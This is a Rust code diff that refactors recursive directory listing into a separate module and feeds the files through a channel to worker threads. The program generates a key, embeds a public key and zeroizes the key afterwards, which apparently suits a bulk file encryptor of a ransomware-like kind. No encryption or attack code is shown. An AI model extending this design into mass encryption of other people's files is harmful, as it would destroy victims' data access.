@@ -1,10 +1,11 @@
-use std::fs::DirEntry;
+use filesystem::recurse_directory_with_channel;
 use std::path::PathBuf;
 use std::vec::Vec;
 
 use zeroize::Zeroize;
 
 mod encryptor;
+mod filesystem;
 
 const _THREADS: i32 = 8;
 
@@ -14,41 +15,18 @@ const PUB_KEY: &[u8] = include_bytes!("../pub.key");
 #[cfg(windows)]
 const PUB_KEY: &[u8] = include_bytes!("..\\pub.key");
 
-fn recurse_directory(path: PathBuf) -> Option<Vec<DirEntry>> {
-    let mut files = Vec::new();
-    if path.read_dir().is_err() {
-        return None;
-    }
-    for file in path.read_dir().unwrap() {
-        if file.is_err() {
-            continue;
-        }
-        let file = file.unwrap();
-
-        if file.path().is_dir() {
-            let new_files = recurse_directory(file.path());
-            if let Some(mut recursed) = new_files {
-                files.append(&mut recursed);
-            }
-        } else if file.path().is_file() {
-            files.push(file);
-        }
-    }
-    return Some(files);
-}
-
 #[tokio::main]
 async fn main() {
     let mut key = encryptor::generate_key();
-    println!("Hello, world!");
+    let (s, r) = crossbeam_channel::unbounded();
 
-    let files = recurse_directory(PathBuf::from("/home/kobiske/Videos/Test Folder/"));
+    let files =
+        recurse_directory_with_channel(PathBuf::from("/home/kobiske/Videos/Test Folder/"), &s);
     if files.is_none() {
         return;
     }
     let files = files.unwrap();
 
-    let (s, r) = crossbeam_channel::unbounded();
     for file in files {
         let _ = s.send(file);
     }
